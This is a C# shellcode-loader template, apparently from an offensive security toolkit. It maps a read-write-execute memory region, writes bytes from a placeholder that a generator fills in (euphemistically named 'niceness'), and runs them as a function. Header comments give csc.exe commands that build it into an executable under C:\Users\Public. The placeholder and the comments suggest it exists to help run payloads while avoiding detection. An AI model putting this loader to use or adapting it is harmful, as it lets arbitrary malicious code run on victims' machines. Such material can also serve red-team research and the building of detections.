////////////////////////////
//
// C# Memory Mapping Template
// Original Template: https://atom0s.com/forums/viewtopic.php?t=178
// Modified By: Brian Fehrman (@fullmetalcache)
// Date Modified: 2018-11-27
//
////////////////////////////

//x64
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64/out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs

//x86
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs

namespace nicenessExample
{
	using System;
	using System.IO.MemoryMappedFiles;
	using System.Runtime.InteropServices;
 
	class Program
	{
		private delegate IntPtr GetPebDelegate();
 
		private unsafe static IntPtr GetPeb()
		{

			const int niceness_length = $$$LENGTH$$$;
			MemoryMappedFile mmf = null;
			MemoryMappedViewAccessor mmva = null;
 
			try
			{
				mmf = MemoryMappedFile.CreateNew("__niceness", niceness_length, MemoryMappedFileAccess.ReadWriteExecute);
 
				mmva = mmf.CreateViewAccessor(0, niceness_length, MemoryMappedFileAccess.ReadWriteExecute);

				$$$NICENESS$$$
			 
				var pointer = (byte*)0;
				mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
 
				var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));
 
				return func();
			}
			catch
			{
				return IntPtr.Zero;
			}
			finally
			{
				mmva.Dispose();
				mmf.Dispose();
			}
		}
 
		static void Main(string[] args)
		{
			var peb = GetPeb();
			Console.WriteLine("PEB is located at: {0:X8}", peb.ToInt32());
		}
	}
}
